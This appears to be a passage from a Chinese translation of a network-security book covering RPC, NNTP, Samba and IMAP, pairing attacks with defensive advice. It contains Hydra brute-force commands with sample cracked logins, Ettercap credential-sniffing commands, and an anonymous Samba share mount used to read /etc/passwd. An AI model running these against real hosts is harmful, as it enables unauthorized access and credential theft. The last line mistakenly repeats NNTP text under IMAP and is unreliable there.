
因此，如果你的主机正在运行 RPC 服务，请考虑以下建议：

-   许多发行版在安装时会启用各种 RPC 服务。请禁用不需要的 RPC 服务。

-   如果不需要 RPC 服务，请禁用 Portmapper 服务。

-   配置你的防火墙，不允许远程用户连接到 RPC 服务。

## NNTP (网络新闻传输协议): 119 (TCP)

NNTP 是一种用于分发、查询、检索和发布新闻文章的协议。

暴力破解：许多 NNTP 服务器不需要身份验证。然而，可以使用 Hydra 等暴力破解工具对需要身份验证的 NNTP 服务器进行暴力破解。

### 暴力破解 NNTP

使用 Hydra 暴力破解 NNTP 账户。以下是操作方法的示例：

```
hydra -L usernames.txt -P passwords.txt 10.0.0.1 nntp
```

### 防止 NNTP 暴力破解

请参见“针对暴力攻击的常见防御措施”。

嗅探：由于 NNTP 是明文协议，因此可以嗅探网络中传输的 NNTP 数据。

### 嗅探 NNTP 身份验证数据

可以使用 Ettercap 等工具嗅探网络中的 NNTP 流量。以下是使用 Ettercap 捕获 NNTP 身份验证数据的方法：

```
ettercap -C -N -m
```

### 通过 SSH 隧道传输 NNTP

使用 SSH 安全地对 NNTP 流量建立隧道。

```
ssh username@remotennptserver.somecompanyasanexample.com -L119:127.0.0.1:119
```

## Samba: 137 到 139 (TCP)

Samba 使用 SMB（服务器消息）协议在网络上共享文件和打印机。SMB 通常用于 Microsoft Windows 操作系统。有关 Samba 项目的详情请访问 http://www.samba.org/。

暴力破解：由于 Samba 使用用户名密码对进行身份验证，因此可以对用户账户进行暴力破解。

### 暴力破解 Samba

可以使用 Hydra 暴力破解 SMB 认证：

```bash
$ hydra -L usernames.txt -P passwords.txt 10.0.0.1 smb
Reduced number of tasks to 1 (smb does not like parallel connections)
Hydra v2.2 (c) 2002) by von Hauser / THC - use only for legal purposes.
Hydra is starting! [parallel tasks: 1, login tries: 2 (1:2/p:1)]
[139]smb login: joe password:5h4k33sound
Hydra finished.
```

### 防止 Samba 暴力破解

请参见“针对暴力攻击的常见防御措施”。

嗅探：可以嗅探 Samba 认证过程中通过网络传输的密码哈希。一旦捕获哈希，必须进行暴力破解以获取真实密码。

### 获取 Samba 密码哈希

可以使用 Ettercap 捕获身份验证期间通过网络发送的 Samba 哈希。例如，以下是运行 Ettercap 收集网络传输的 SMB 密码哈希的方法：

```
ettercap -C -N -m
```

可以使用 John the Ripper 等密码破解器（可在 http://www.openwall.com/john/ 获取）来破解获取的哈希。

### 安全传输 Samba流量

请参见“阻塞和隧道 Samba 流量”。

## 第4 章：远程攻击

### Samba 配置错误

Samba 经常配置错误以共享包含关键数据的文件系统。远程用户可以利用此类漏洞获取位于受害者主机上的敏感系统文件。

### 列举并挂载远程共享

使用 Samba 的 `smbclient` 命令查找远程服务器导出的文件共享：

```bash
bash]$ smbclient -L smserver -I 192.168.1.10 -U ''
```
（注：由于提供的文本包含大量 OCR 错误和重复内容，此处翻译已根据逻辑清理并提取了核心技术步骤）

| 共享名称 | 类型 | 注释 |
| --- | --- | --- |
| IPC$ | IPC | IPC 服务 (.) |
| ADMIN$ | Disk | IPC 服务 (.) |
| etc | Disk | 配置文件 |
| Server | Comment | |
| SMBSERVER | SomeCompanyAsExample |

现在，由于上述服务器显然被配置错误为向所有人提供 `/etc` 目录，可以使用以下挂载命令进行挂载：

```bash
mount -t smbfs -o username='' /192.168.1.10/etc /mnt/smbshare
```

在挂载 `/etc` 共享后，入侵者可能会获取 `/etc/passwd` 文件，该文件将在其主机上变为 `/mnt/smbshare/passwd`。

### 阻塞和隧道 Samba 流量

如果正在运行 Samba，请考虑以下建议：

-   配置你的防火墙阻止 Samba 流量。
-   考虑使用 SSH 对 Samba 流量建立隧道：

```bash
ssh username@remotesmbserver.somecompanyasanexample.com -L139:127.0.0.1:139
```

## IMAP2/IMAP4 (互联网消息访问协议 2/4): 143 (TCP)

IMAP  是一种用于从邮件服务器访问邮件的协议。其功能包括在远程位置存储邮件。

IMAP 身份验证容易受到暴力破解。

### 暴力破解 IMAP

可以使用 Hydra 暴力破解 IMAP：

```bash
hydra -L usernames.txt -P passwords.txt -s 143 192.168.1.1 imap
Hydra v2.2 (c) 2002) by Hauser / THC - use only for legal purposes.
Hydra is starting: [parallel tasks: 4, login tries: 4 (1:1/p:4)] [143] imap login: pardesi password: estd1948!!
Hydra finished.
```

### 防止 IMAP 暴力破解

请参见“针对暴力攻击的常见防御措施”。

嗅探：由于 NNTP 是明文协议，因此可以嗅探网络中传输的 NNTP 数据。
